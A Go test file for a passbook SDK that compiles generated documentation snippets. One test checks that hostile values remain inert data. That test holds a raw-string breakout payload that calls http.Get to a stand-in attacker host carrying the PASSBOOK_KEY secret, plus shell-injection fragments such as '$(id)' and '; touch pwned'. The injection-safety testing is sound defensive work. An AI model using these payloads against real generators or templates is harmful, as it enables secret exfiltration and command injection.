package passbook

import (
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// Every generated Go snippet builds against this SDK: the same text the reference pages show.
func TestSnippetsCompile(t *testing.T) {
	sdk, err := filepath.Abs(".")
	if err != nil {
		t.Fatal(err)
	}
	files, err := filepath.Glob("../../docs/developers/snippets/generated/go/*.go")
	if err == nil && len(files) == 0 {
		t.Skip("docs/developers/snippets is not beside this module")
	}
	if err != nil || len(files) < 150 {
		t.Fatalf("found %d snippets, err %v", len(files), err)
	}
	dir := snippetModule(t, sdk)
	for _, f := range files {
		src, err := os.ReadFile(f)
		if err != nil {
			t.Fatal(err)
		}
		name := strings.NewReplacer(".", "_").Replace(strings.TrimSuffix(filepath.Base(f), ".go"))
		out := filepath.Join(dir, "cmd", name)
		if err := os.MkdirAll(out, 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(out, "main.go"), src, 0o600); err != nil {
			t.Fatal(err)
		}
	}
	cmd := exec.Command("go", "vet", "./...")
	cmd.Dir = dir
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("go vet: %v\n%s", err, out)
	}
}

func snippetModule(t *testing.T, sdk string) string {
	t.Helper()
	dir := t.TempDir()
	gomod := "module snippets\n\ngo 1.22\n\nrequire github.com/vladzaharia/passbook/sdk/go v0.0.0\n\nreplace github.com/vladzaharia/passbook/sdk/go => " + sdk + "\n"
	if err := os.WriteFile(filepath.Join(dir, "go.mod"), []byte(gomod), 0o600); err != nil {
		t.Fatal(err)
	}
	return dir
}

// rawString is the generator's goRawString: raw-string pieces joined with "`" literals.
func rawString(text string) string {
	pieces := strings.Split(text, "`")
	for i, p := range pieces {
		pieces[i] = "`" + p + "`"
	}
	return strings.Join(pieces, " + \"`\" + ")
}

// A sample whose body values are hostile still compiles, and the values stay data: a compiler, not a parser, sees it.
func TestHostileSampleCompiles(t *testing.T) {
	sdk, err := filepath.Abs(".")
	if err != nil {
		t.Fatal(err)
	}
	goPayload := "`+fmt.Sprint(http.Get(\"https://attacker.invalid/?k=\"+os.Getenv(\"PASSBOOK_KEY\")))+`"
	mixed := "a'b\"c`d\\e\n$(id) ${PASSBOOK_KEY} ; touch pwned #"
	text, err := json.MarshalIndent(map[string]any{"note": goPayload, "other": mixed, goPayload: []any{mixed, map[string]any{"deep": goPayload}}}, "", "  ")
	if err != nil {
		t.Fatal(err)
	}
	src := `package main

import (
	"context"
	"encoding/json"
	"fmt"
	"os"

	passbook "github.com/vladzaharia/passbook/sdk/go"
)

func main() {
	ctx := context.Background()
	pb, err := passbook.NewClient(os.Getenv("PASSBOOK_KEY"))
	if err != nil {
		panic(err)
	}

	var body passbook.PassesCreateBody
	if err := json.Unmarshal([]byte(` + rawString(string(text)) + `), &body); err != nil {
		panic(err)
	}

	result, err := pb.Passes.Create(ctx, &body)
	if err != nil {
		panic(err)
	}
	fmt.Printf("%+v\n", result)
}
`
	dir := snippetModule(t, sdk)
	if err := os.MkdirAll(filepath.Join(dir, "cmd", "hostile"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "cmd", "hostile", "main.go"), []byte(src), 0o600); err != nil {
		t.Fatal(err)
	}
	cmd := exec.Command("go", "vet", "./...")
	cmd.Dir = dir
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("go vet: %v\n%s", err, out)
	}
}
